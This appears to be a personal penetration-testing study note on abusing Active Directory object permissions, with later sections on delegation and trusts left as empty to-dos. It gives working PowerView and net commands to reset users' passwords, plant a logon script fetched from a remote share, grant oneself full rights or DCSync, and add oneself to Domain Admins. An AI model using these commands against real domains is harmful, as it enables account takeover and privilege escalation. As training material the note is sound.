In this module we will exploit AD Object Permissions, Keberos Delegation and AD Trust - due to the complexity of the large org deployments there are always misconfigurations.

## AD Object Permissions
Users, Computers and groups are objects in AD with associated set of permissions. If permissions set incorrectly we can exploit them. 
#AD #permissions 

The object security is controlled by the **DACL** -Discretionary ACL which has the **ACE** - Access Control Enties. If multiple ACE, the order matters e.g. if deny first the access is denied. ACE is stored as **SDDL** - Security Descriptior Definition Lang, which has specific format.

```text
ace_type;ace_flags;rights;object_guid;inherit_object_guid:account_sid
```

This ACE would apply to account_sid on the object_guid with the specific rights: A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0.

**All authenticated users in AD can read AD Objects and their DACLs.** So once we compromise any AD user, we can perform the AD enum.

#powerview #dacl #enum 
We can use Powerview scripts for enum, like Get-ObjectAcl.
[[AD Enum - Powerview & Bloodhound#^f54063]]

It is a lengthy list of ACEs applied to the object, we need to look at **ActiveDirectoryRights, SecurityIdentifier, AceType**.
To read SecurityIdentifier (in this case we have access to the enumerated Identitity), we can call the following:
#powerview 
[[AD Enum - Powerview & Bloodhound#^ea8e3b]]

For lengthy DACL which affects our domain user, we can use the following oneliner to resolve the SID :
#powerview #enum #dacl
[[Oneliners - ps1#^d8fba8]]

#exploit-ad 
#### User
For **User** objects we can exploit the following ACE:
GenericAll, ExtendedRights (User-Force-Change-Password) GenericWrite, or WriteDACL

For **GenericAll and ExtendedRights** we can just change password:
#cmd
```cmd
net user <user> <pass> /domain
```

For **GenericWrite** we can add the logon script to the user:
#ps1 #powerview
```powershell
Set-DomainObject -Identity <user_name> -Set  @{"scriptPath" = "\\10.0.0.5\totallyLegitScript.ps1"}
```


For **WriteDACL** we grant ourselves ourselves **GenericAll** or **DCSync**:
#ps1 #powerview 
```powershell
Add-DomainObjectAcl -TargetIdentity <user_name> -PrincipalIdentity <our_user> -Rights All
```
All or DCSync

To exploit **DCSync**:
To-do: Link


#### Group
For **Group** we need: GenericAll, WriteProperty, GenericWrite, Self (Self-Membership), WriteOwner

For **GenericAll, WriteProperty, GenericWrite, Self (Self-Membership)*** we can just add ourselves to the group:
#cmd
```cmd
net group <group_name> <our_user> /add /domain
```
or with powerview:
#powerview #ps1
```powershell
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

For **WriteOwner** we can add ourselves as owner:
#powerview #ps1 
```powershell
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

There is also the case where we have the WriteOwner + WriteDACL, link
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#writedacl-+-writeowner

#### Computer
For **Computers** when we have the GenericAll, GenericWrite and Write we can abuse the Kerb Resouce-based constrained delegation. 

To-do: Link

## GPO and OU Abuse

To-do. 


## Kerberos Delegation


## AD Forrest










